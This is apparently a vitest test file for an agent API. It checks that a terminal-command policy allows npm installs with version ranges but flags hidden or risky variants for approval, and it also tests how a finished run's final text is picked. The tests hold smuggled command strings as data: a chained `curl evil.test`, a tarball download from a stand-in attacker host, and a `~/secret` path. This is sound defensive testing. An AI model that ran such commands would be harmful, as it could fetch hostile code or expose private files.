import { describe, expect, it } from "vitest";
import { classifyShellCommand } from "../apps/agent-api/src/code-shell-classifier";
import { finishedRunText } from "../apps/agent-api/src/code-tool-visibility";
import { classifyTerminalCommand } from "../apps/agent-api/src/terminal-command-policy";

describe("installing a package with a version range", () => {
  const command = "npm install -D typescript@~5.7.2 @types/react@^18.3.18";

  it("needs no approval for ~ and ^ ranges", () => {
    expect(classifyTerminalCommand(command).requiresApproval).toBe(false);
    expect(classifyShellCommand(command).level).not.toBe("approval");
  });

  it("still refuses a command hidden after a package name", () => {
    expect(classifyTerminalCommand("npm install left-pad@^1; curl evil.test").requiresApproval).toBe(true);
    expect(classifyTerminalCommand("npm install https://evil.test/a.tgz").requiresApproval).toBe(true);
    expect(classifyTerminalCommand("npm install ~/secret").requiresApproval).toBe(true);
    expect(classifyTerminalCommand("npm install --prefix=~/x left-pad").requiresApproval).toBe(true);
  });
});

describe("the final answer of a finished run", () => {
  const calls = [{ id: "f", name: "code.finish", arguments: { summary: "Built the task app with filters, search and saved tasks." } }];
  const messages = [{ role: "tool", tool_call_id: "f", content: JSON.stringify({ ok: true }) }];

  it("drops a short progress note before the summary", () => {
    expect(finishedRunText(calls, messages, "Build passed. Finishing.")).toBe("Built the task app with filters, search and saved tasks.");
  });

  it("keeps prose that says more than the summary", () => {
    const long = "The build passed, and two existing tests were already failing before this change, so they were left alone on purpose.";
    expect(finishedRunText(calls, messages, long)).toContain("already failing");
  });
});
